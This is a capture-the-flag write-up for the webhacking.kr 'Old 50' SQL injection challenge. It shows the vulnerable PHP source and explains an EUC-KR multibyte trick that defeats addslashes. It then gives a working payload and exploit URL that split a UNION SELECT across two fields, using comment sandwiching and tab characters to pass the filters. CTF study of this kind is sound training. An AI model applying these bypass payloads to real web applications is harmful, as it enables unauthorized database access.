# Old 50    SQLi (Unicode)

URL: [https://webhacking.kr/challenge/web-25/](https://webhacking.kr/challenge/web-25/)
Source: [https://webhacking.kr/challenge/web-25/?view_source=1](https://webhacking.kr/challenge/web-25/?view_source=1)

```php
...
...
<h1>SQL INJECTION</h1>
<form method=get>
id : <input name=id value='guest'><br>
pw : <input name=pw value='guest'><br>
<input type=submit>&nbsp;&nbsp;&nbsp;<input type=reset>
</form>
<?php if ($_GET["id"] && $_GET["pw"]) {
    $db = dbconnect();
    $_GET["id"] = addslashes($_GET["id"]);
    $_GET["pw"] = addslashes($_GET["pw"]);
    $_GET["id"] = mb_convert_encoding($_GET["id"], "utf-8", "euc-kr");
    foreach ($_GET as $ck) {
        if (preg_match("/from|pw|\(|\)| |%|=|>|</i", $ck)) {
            exit();
        }
    }
    if (preg_match("/union/i", $_GET["id"])) {
        exit();
    }
    $result = mysqli_fetch_array(
        mysqli_query(
            $db,
            "select lv from chall50 where id='{$_GET["id"]}' and pw=md5('{$_GET["pw"]}')"
        )
    );
    if ($result) {
        if ($result["lv"] == 1) {
            echo "level : 1<br><br>";
        }
        if ($result["lv"] == 2) {
            echo "level : 2<br><br>";
        }
    }
    if ($result["lv"] == "3") {
        solve(50);
    }
    if (!$result) {
        echo "Wrong";
    }
} ?>
...
```

[mb_convert_encoding](https://www.php.net/manual/en/function.mb-convert-encoding.php) — Convert a string from one character encoding to another

[Extended Unix Code](https://www.wikiwand.com/en/Extended_Unix_Code): _The structure of EUC is based on the [ISO/IEC 2022](https://www.wikiwand.com/en/ISO/IEC_2022 "ISO/IEC 2022") standard, which specifies a system of graphical character sets that can be represented with a sequence of the 94 7-bit bytes [0x](https://www.wikiwand.com/en/Hexadecimal "Hexadecimal")21–7E, or alternatively 0xA1–FE if an eighth bit is available._

```php
<?php 

// EUC-KR characters range from 0xA1A1 to 0xFEFE, excluding some ranges
for ($first_byte = 0xA1; $first_byte <= 0xFE; $first_byte++) {
    for ($second_byte = 0xA1; $second_byte <= 0xFE; $second_byte++) {
        $euc_kr_bytes = chr($first_byte) . chr($second_byte);
        $char = mb_convert_encoding($euc_kr_bytes, 'UTF-8', 'EUC-KR');
        echo sprintf("%02X%02X", $first_byte, $second_byte) . ' ' . $char . PHP_EOL;
    }
}
```

Funky things happen within PHP function if we replace second byte which is not in range. if printed it looks like unprintable character, but php simply doesn't decode them and `0xA1A0` becomes 2 bytes, instead of 1.

```python
>>> hex(ord("'"))
'0x27'
```

`0xA127` is invalid `euc-kr` byte, but when decoded it's `garbage` and `'`, the addslashes will not work on this because decode happens after.

Next we need to return `3` to pwn the room. That's easy with `UNION`, but we are restricted. Using `pw` field is also restricted because of `md5` function.

We can basically sandwich the solution. Something like:
```sql
SELECT id, pw FROM user WHERE id='sand'/* AND pw=md5('*/wich#')
```

Payload:
```sql
id: %A1'/*                                               #'
pw: */UNION%09SELECT%093%23                              #
```

> **Note**: `%09` is tab, used to bypass space filter. `%23` is `#` to comment anything after injection. Raw `#` will not work in URL!

[https://webhacking.kr/challenge/web-25/?id=%A2%27/*&pw=*/UNION%09SELECT%093%23](https://webhacking.kr/challenge/web-25/?id=%A2%27/*&pw=*/UNION%09SELECT%093%23)

